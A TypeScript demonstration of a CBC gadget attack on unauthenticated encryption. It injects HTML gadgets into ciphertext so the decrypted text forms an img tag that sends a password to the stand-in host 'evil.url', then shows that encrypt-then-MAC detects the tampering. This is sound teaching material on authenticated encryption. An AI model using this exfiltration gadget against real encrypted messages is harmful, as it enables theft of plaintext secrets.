import {Buffer} from 'node:buffer'
import {randomBytes} from "node:crypto";
import {decrypt, encrypt} from "./encryptWithoutMac.js";
import {injectGadget} from "./cbc-gadgets.js";
import {checkMacThenDecrypt, encryptThenMac} from "./encryptWithMac.js";

const message = Buffer.from('Your password is:Se@ld-i5-great')
const gadget0 = Buffer.from(' <img ignore= " ')
const gadget1 = Buffer.from(' " src=evil.url/')

const firstBlock = Buffer.from('Your password is')

if (!message.subarray(0, 16).equals(firstBlock)) throw new Error('the first block must be known for the attack to work')
const encryptWithoutMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buffer, gagdet0: Buffer, gadget1: Buffer) => {
    const key = randomBytes(32)

    const encryptedMessage = encrypt(message, key)

    const maliciousMessage = injectGadget(encryptedMessage, firstBlock, gagdet0, gadget1)

    const decryptedMessage = decrypt(maliciousMessage, key).toString('utf8')

    console.log('decryptedMessage:', decryptedMessage) // contains something like: <img ignore= "**garbage**" src=evil.url/:Se@ld-i5-great
}

encryptWithoutMacInjectGadgetThenDecrypt(message, firstBlock, gadget0, gadget1)
const encryptWithMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buffer, gagdet0: Buffer, gadget1: Buffer) => {
    const keyEnc = randomBytes(32)
    const keyMac = randomBytes(32)

    const encryptedMessage = encryptThenMac(message, keyEnc, keyMac)

    const maliciousMessage = injectGadget(encryptedMessage, firstBlock, gagdet0, gadget1)

    try {
        checkMacThenDecrypt(maliciousMessage, keyEnc, keyMac).toString('utf8')
        // we should not reach this point as checkMacThenDecrypt should throw MAC invalid
        throw new Error('Unexpected: MAC is valid')
    } catch (error) {
        if (error.message !== 'MAC invalid') throw error
        console.warn('MAC verification has failed, a modification of the ciphertext has been detected')
    }
}

encryptWithMacInjectGadgetThenDecrypt(message, firstBlock, gadget0, gadget1)

